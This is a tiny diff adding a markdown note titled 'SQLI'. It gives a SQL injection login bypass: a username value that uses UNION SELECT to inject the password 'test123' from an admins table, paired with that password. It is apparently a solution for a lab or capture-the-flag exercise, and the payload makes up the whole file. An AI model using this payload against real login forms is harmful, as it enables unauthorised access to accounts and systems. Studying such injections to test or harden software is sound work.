@@ -1,0 +1,8 @@
+# SQLI
+
+
+Username:
+randomuser' UNION SELECT 'test123' AS password FROM admins WHERE '1'='1
+
+Password:
+test123
